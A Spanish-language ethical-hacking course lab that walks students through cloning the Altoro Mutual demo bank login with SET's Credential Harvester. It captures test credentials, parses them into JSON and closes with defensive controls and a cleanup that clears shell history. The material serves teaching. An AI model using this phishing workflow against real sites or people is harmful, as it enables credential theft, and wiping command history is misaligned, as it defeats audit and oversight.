# Laboratorio Semana 11 - Ingeniería social mediante clonación y captura de credenciales en Kali Linux - (CY-203 Hackeo Ético)

---

## 1. Objetivos
1. Clonar el portal de demostración `http://demo.testfire.net/login.jsp` que simula la banca en línea de Altoro Mutual.  
2. Ajustar el formulario para que envíe las credenciales al servidor local.  
3. Capturar credenciales de prueba y almacenarlas en `creds.json`.  
4. Generar un informe en `informe_final.json` y proponer controles defensivos.

---

## 2. Requisitos técnicos  
| Componente | Versión mínima | Verificación |
|------------|----------------|--------------|
| Kali Linux | 2025.2 | `cat /etc/os-release` |
| Python | 3.11 | `python3 --version` |
| Social Engineer Toolkit (SET) | 9.1 | `setoolkit --version` |
| Apache | 2.4 | `apache2 -v` |
| jq | 1.7 | `jq --version` |

---

## 3. Preparación del entorno
```bash
sudo apt update && sudo apt -y full-upgrade
sudo apt -y install apache2 jq
sudo systemctl enable --now apache2
mkdir -p ~/week11_phish && cd ~/week11_phish
```
---

## 4. Clonado del sitio con SET
```text
1. sudo setoolkit
2. 1 Social Engineering Attacks
3. 2 Website Attack Vectors
4. 3 Credential Harvester
5. 2 Site Cloner
6. URL objetivo: https://demo.testfire.net
7. IP de Kali cuando se solicite (consulta con: ip -br addr)
```
Los archivos clonados se almacenan usualmente en `/var/www/html`.

---

## 5. Ejecución del harvester
```bash
sudo systemctl stop apache2        # libera el puerto 80
# SET mostrará: Credential Harvester is running on port 80
# Desde la víctima visita http://IP_Kali/login.jsp y envía credenciales de prueba
```
---

## 6. Reporte de SET
```bash
sudo ls -l /root/.set/reports
# Ejemplo de archivo:
# /root/.set/reports/2025-07-21 17:40:52.546938.xml
```
---

## 7. Extracción de credenciales a JSON
```bash
sudo cp '/root/.set/reports/2025-07-21 17:40:52.546938.xml' ~/week11_phish/report.xml
sudo chown $USER:$USER ~/week11_phish/report.xml
cd ~/week11_phish

grep -Eo '(uid|username)=[^&]+&(passw|password)=[^<]+' report.xml | \
awk -F'[=&]' '{u=($1~/uid|username/)?$2:$4; p=($3~/passw|password/)?$4:$2; print "{\"user\":\""u"\",\"pass\":\""p"\"}"}' | \
jq -s '.' > creds.json
```
---

## 8. Informe final
Create `informe_final.json`:
```json
{
  "victims": 3,
  "site_cloned": "https://demo.testfire.net",
  "credentials_file": "creds.json",
  "attack_vector": "Correo de alerta de transacción",
  "timestamp": "2025-07-21T17:00:00-06:00"
}
```
---

## 9. Controles defensivos sugeridos
* Activar autenticación de dos factores en la banca en línea.  
* Configurar SPF, DKIM y DMARC para evitar suplantación de correos.  
* Sensibilizar a los usuarios sobre la verificación del dominio y el candado TLS.  
* Bloquear dominios recién registrados desde el gateway de correo.

---

## 10. Limpieza
```bash
sudo pkill -f setoolkit
sudo systemctl start apache2
sudo rm -rf /var/www/html/*
history -c
```

 - ---

**Profesor:** Esteban Mata Morales  
**Curso:** CY-203 Hackeo Ético  
**Universidad Fidélitas de Costa Rica**
